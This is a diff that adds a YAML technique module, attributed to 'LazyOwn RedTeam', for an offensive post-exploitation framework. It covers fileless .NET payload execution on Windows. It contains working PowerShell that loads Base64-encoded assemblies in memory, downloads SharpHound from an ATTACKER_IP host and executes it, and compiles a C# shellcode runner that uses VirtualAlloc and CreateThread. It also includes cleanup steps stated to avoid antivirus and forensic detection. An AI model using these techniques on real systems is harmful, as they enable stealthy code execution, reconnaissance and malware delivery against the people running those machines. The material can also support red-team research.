@@ -1,0 +1,95 @@
+name: dotnet_reflection
+version: "1.0"
+description: >
+  .NET reflection-based assembly loading techniques for in-memory payload execution.
+  Avoids writing executables to disk, evading file-based AV scanning and forensic artifacts.
+author: "LazyOwn RedTeam"
+category: "evasion"
+phase: "post_exploitation"
+permissions:
+  - shell
+  - memory
+  - network
+platforms:
+  - windows
+enabled: true
+tags:
+  - dotnet
+  - reflection
+  - assembly_load
+  - in_memory
+  - evasion
+  - fileless
+
+techniques:
+  - name: "Assembly.Load from Base64"
+    description: >
+      Loads a .NET assembly entirely from a Base64-encoded byte array using [System.Reflection.Assembly]::Load.
+      No file touches disk — the assembly is decoded and loaded directly into memory.
+      Suitable for C# payloads compiled on the attacker side and delivered as base64 strings.
+    requires_admin: false
+    command: |
+      $assemblyBase64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAA..."
+      $assemblyBytes = [System.Convert]::FromBase64String($assemblyBase64)
+      $assembly = [System.Reflection.Assembly]::Load($assemblyBytes)
+      $entryPoint = $assembly.GetTypes()[0].GetMethod('Main')
+      $entryPoint.Invoke($null, @(,[string[]]@()))
+    cleanup: >
+      [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers()
+    references:
+      - "https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load"
+      - "https://www.ired.team/offensive-security/code-execution/using-net-reflection-for-fileless-execution"
+
+  - name: "Reflection.Assembly.Load from URL — Fileless Remote Load"
+    description: >
+      Downloads a .NET assembly from a remote URL and loads it directly into memory
+      via reflection. No file is written to disk. Uses WebClient.DownloadData
+      to fetch the raw bytes, then Assembly.Load to execute in the current AppDomain.
+    requires_admin: false
+    command: |
+      $url = "http://ATTACKER_IP/SharpHound.exe"
+      $webClient = New-Object System.Net.WebClient
+      $assemblyBytes = $webClient.DownloadData($url)
+      $assembly = [System.Reflection.Assembly]::Load($assemblyBytes)
+      $type = $assembly.GetTypes() | Where-Object { $_.Name -eq 'Program' }
+      $method = $type.GetMethod('Main')
+      $method.Invoke($null, @(,[string[]]@('--CollectionMethods', 'All')))
+    cleanup: >
+      $webClient.Dispose(); [System.GC]::Collect()
+    references:
+      - "https://www.ired.team/offensive-security/code-execution/using-net-reflection-for-fileless-execution"
+      - "https://github.com/BloodHoundAD/SharpHound3"
+
+  - name: "Add-Type Compilation from Memory — Embedded C#"
+    description: >
+      Compiles C# source code in memory using Add-Type and executes it immediately.
+      The source code is provided as a string, compiled by csc.exe in a temp directory
+      (the resulting DLL is loaded into the AppDomain and can be cleaned up).
+      Extends the technique with CodeDomProvider for fully in-memory compilation on .NET 5+.
+    requires_admin: false
+    command: |
+      $sourceCode = @'
+      using System;
+      using System.Runtime.InteropServices;
+      public class ShellcodeRunner {
+          [DllImport("kernel32.dll")]
+          public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+          [DllImport("kernel32.dll")]
+          public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+          [DllImport("kernel32.dll")]
+          public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+          public static void Run(byte[] shellcode) {
+              IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+              Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+              IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+              WaitForSingleObject(hThread, 0xFFFFFFFF);
+          }
+      }
+      '@
+      Add-Type -TypeDefinition $sourceCode -Language CSharp
+      [ShellcodeRunner]::Run($shellcodeBytes)
+    cleanup: >
+      Remove-TypeData ShellcodeRunner -ErrorAction SilentlyContinue; [System.GC]::Collect()
+    references:
+      - "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type"
+      - "https://www.ired.team/offensive-security/code-injection/process-injection/injecting-shellcode-with-powershell-add-type"
